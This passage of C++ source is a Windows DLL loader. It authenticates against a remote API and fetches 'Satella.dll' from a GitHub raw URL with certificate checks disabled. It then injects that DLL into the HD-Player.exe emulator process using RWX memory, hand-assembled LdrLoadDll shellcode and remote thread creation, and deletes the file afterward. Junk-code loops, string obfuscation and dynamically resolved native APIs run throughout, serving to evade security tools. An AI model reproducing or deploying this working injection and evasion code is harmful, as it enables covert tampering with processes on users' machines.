    // Use NT file write instead of CreateFileW
    wchar_t buf[128];
    int len=0; while(u[len]){buf[len]=u[len];len++;} buf[len++]=L'|';
    int pl=0; while(pwd[pl]){buf[len+pl]=pwd[pl];pl++;} buf[len+pl]=0;
    _NtWriteFileTo(path,buf,(DWORD)((wcslen(buf)+1)*sizeof(wchar_t)));
}
static void _NotifyApi() {
    char ha[64]; _GetCompName(ha,sizeof(ha));
    std::string body=std::string(OA("{\"username\":\""))+ha+OA("\"}");
    int rl=0; char* r=_HttpPost(OA("/api/notify_download"),body.c_str(),&rl); free(r);
}
static void _DelDll(const wchar_t* p) { if(p&&p[0])_DelFW(p); }

// ============================================================
// Download DLL via WinHTTP (dynamic)
// ============================================================
static bool _Download(const wchar_t* outPath) {
    HINTERNET hs=_WHO(OW(L"Mozilla/5.0"),WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,NULL,NULL,0);
    if(!hs)return false;
    HINTERNET hc=_WHC(hs,OW(L"raw.githubusercontent.com"),INTERNET_DEFAULT_HTTPS_PORT,0);
    if(!hc){_WHCH(hs);return false;}
    HINTERNET hr=_WHOR(hc,OW(L"GET"),OW(L"/semataryiscrazy/binallbossss/refs/heads/main/Satella.dll"),NULL,NULL,NULL,WINHTTP_FLAG_SECURE);
    if(!hr){_WHCH(hc);_WHCH(hs);return false;}
    DWORD sf=SECURITY_FLAG_IGNORE_UNKNOWN_CA|SECURITY_FLAG_IGNORE_CERT_CN_INVALID|SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    _WHSO(hr,WINHTTP_OPTION_SECURITY_FLAGS,&sf,sizeof(sf));
    bool ok=false;
    if(_WHSR(hr,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0)){
        if(_WHRR(hr,NULL)){
            int cap=8192,used=0;
            BYTE* buf=(BYTE*)malloc(cap);
            if(buf){
                DWORD rd;
                while(_WHRD(hr,buf+used,cap-used-1,&rd)&&rd){
                    used+=rd;
                    if(used+8192>cap){cap+=8192;buf=(BYTE*)realloc(buf,cap);}
                }
                if(used>1000) ok=_NtWriteFileTo(outPath,buf,used);
                free(buf);
            }
        }
    }
    _WHCH(hr);_WHCH(hc);_WHCH(hs);
    return ok;
}

static bool _Inject(DWORD pid, const wchar_t* dllPath) {
    _Junk();
    HANDLE hp=NULL;
    if(_NtOP){
        MY_CLIENT_ID cid={(HANDLE)(ULONG_PTR)pid,NULL};
        OBJECT_ATTRIBUTES oa={sizeof(oa)};
        _NtOP(&hp,PROCESS_ALL_ACCESS,&oa,&cid);
    }
    if(!hp) return false;
    _Junk();
    
    // Resolve LdrLoadDll address
    HMODULE hNtdll=GetModuleHandleW(L"ntdll.dll");
    if(!hNtdll){ _NtClose(hp); return false; }
    FARPROC pLdrLoadDll=GetProcAddress(hNtdll,"LdrLoadDll");
    if(!pLdrLoadDll){ _NtClose(hp); return false; }
    
    // Build remote data + shellcode
    DWORD len=(DWORD)wcslen(dllPath);
    DWORD pathBytes=len*2+2;
    DWORD total=256+16+8+4+pathBytes;
    BYTE* buf=(BYTE*)malloc(total);
    if(!buf){ _NtClose(hp); return false; }
    memset(buf,0,total);
    
    // Build UNICODE_STRING at offset 256
    BYTE* usBuf=buf+256;
    *(USHORT*)(usBuf+0)=len*2;
    *(USHORT*)(usBuf+2)=len*2+2;
    BYTE* remoteData=NULL;
    SIZE_T rsize=total;
    if(_NtAVM)_NtAVM(hp,(PVOID*)&remoteData,0,&rsize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    if(!remoteData){ free(buf); _NtClose(hp); return false; }
    *(ULONGLONG*)(usBuf+8)=(ULONGLONG)(remoteData+256+16+8+4);
    memcpy(buf+256+16+8+4,dllPath,pathBytes);
    
    // Shellcode thunk:
    BYTE* sc=buf;
    int si=0;
    sc[si++]=0x48; sc[si++]=0x83; sc[si++]=0xEC; sc[si++]=0x38;
    sc[si++]=0x48; sc[si++]=0x33; sc[si++]=0xC9;
    int flagsOff=256+16+8;
    int scEnd=si+7;
    int rel32=flagsOff-scEnd;
    sc[si++]=0x48; sc[si++]=0x8D; sc[si++]=0x15;
    memcpy(sc+si,&rel32,4); si+=4;
    int usOff=256;
    scEnd=si+7;
    rel32=usOff-scEnd;
    sc[si++]=0x4C; sc[si++]=0x8D; sc[si++]=0x05;
    memcpy(sc+si,&rel32,4); si+=4;
    int mhOff=256+16;
    scEnd=si+7;
    rel32=mhOff-scEnd;
    sc[si++]=0x4C; sc[si++]=0x8D; sc[si++]=0x0D;
    memcpy(sc+si,&rel32,4); si+=4;
    sc[si++]=0x48; sc[si++]=0xB8;
    memcpy(sc+si,&pLdrLoadDll,8); si+=8;
    sc[si++]=0xFF; sc[si++]=0xD0;
    sc[si++]=0x48; sc[si++]=0x83; sc[si++]=0xC4; sc[si++]=0x38;
    sc[si++]=0xC3;
    
    if(_NtWVM)_NtWVM(hp,remoteData,buf,total,NULL);
    
    HANDLE hT=NULL;
    if(_NtCTE){
        _NtCTE(&hT,THREAD_ALL_ACCESS,NULL,hp,remoteData,NULL,0,0,0,0,NULL);
    }
    if(!hT&&_CRT){
        hT=_CRT(hp,NULL,0,(LPTHREAD_START_ROUTINE)remoteData,NULL,0,NULL);
    }
    
    bool inj=false;
    if(hT){
        if(_WFS)_WFS(hT,10000);
        ULONGLONG remoteMH=0;
        if(_NtRVM)_NtRVM(hp,(PVOID)(remoteData+256+16),&remoteMH,8,NULL);
        inj=(remoteMH!=0);
        if(_CH)_CH(hT); else _NtClose(hT);
    }
    free(buf);
    _NtClose(hp);
    return inj;
}

// ============================================================
// Entry
// ============================================================
static void _DebugLog(const char* msg) {
    (void)msg;
}

#ifdef DEBUG_LOADER
int main() {
    LPSTR lpCmd = GetCommandLineA();
    // skip program name
    if (*lpCmd == '"') { lpCmd++; while (*lpCmd && *lpCmd != '"') lpCmd++; if (*lpCmd) lpCmd++; }
    else while (*lpCmd && *lpCmd != ' ') lpCmd++;
    while (*lpCmd == ' ') lpCmd++;
#else
int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR lpCmd,int){
#endif
    {
        volatile DWORD j=0;
        for(int i=0;i<100;i++){ j+=GetTickCount(); j^=j>>3; _Junk(); }
    }
    __try {
        bool initOk = _Init();
        if(!initOk) return 1;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return 1;
    }
    _Junk();

    int authed=_CredLoad()?1:0;
    if(!authed&&lpCmd&&lpCmd[0]){
        char args[256]; strcpy_s(args,sizeof(args),lpCmd);
        char* u=args; char* pwd=strchr(args,' ');
        if(pwd){
            *pwd++=0;
            char* key=strchr(pwd,' ');
            if(key){*key++=0;authed=_AuthRegister(u,pwd,key);if(authed)_CredSave(u,pwd);}
            else{authed=_AuthLogin(u,pwd);if(authed)_CredSave(u,pwd);}
        }
    }

    wchar_t dllPath[MAX_PATH];
    if(!_GTPW(MAX_PATH,dllPath)) wcscpy(dllPath,OW(L"C:\\Users\\Public\\Temp"));
    wcscat(dllPath,OW(L"\\Satella.dll"));
    _Junk();

    if(authed) _Download(dllPath);

    DWORD pid=0;
    const wchar_t* target=OW(L"HD-Player.exe");
    while((pid=_FindPidByName(target))==0) _Sleep(2000);

    _Junk();
    { volatile DWORD d=0; for(int i=0;i<50;i++){ d+=GetTickCount(); _Junk(); } }

    bool inj=_Inject(pid,dllPath);
    if(inj) _DelDll(dllPath);
    _Junk();
    return inj?0:2;
}
